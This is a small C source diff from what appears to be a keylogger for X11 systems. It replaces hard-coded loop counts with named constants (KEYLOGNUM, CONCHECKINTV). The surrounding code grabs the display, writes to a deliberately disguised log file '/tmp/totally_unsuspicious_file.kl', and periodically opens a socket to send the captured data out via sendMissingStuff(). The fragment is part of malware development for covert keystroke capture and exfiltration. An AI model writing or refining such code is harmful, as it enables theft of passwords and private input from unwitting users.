@@ -14,6 +14,9 @@
 #define NIL (0)
 #define READLEN 1
 
+#define KEYLOGNUM 10
+#define CONCHECKINTV 5
+
 // stuff
 char *filename = "/tmp/totally_unsuspicious_file.kl";
 
@@ -51,10 +54,10 @@ int main() {
 	grab(dpy);
 
 	int i = 0;
-	while(i < 10) {
+	while(i < KEYLOGNUM) {
 
 		// check for internet connection
-		if(i%4 == 0 && !connected)
+		if(i%CONCHECKINTV == 0 && !connected)
 			if( (connected = connectSocket()) )
 				sendMissingStuff();
 
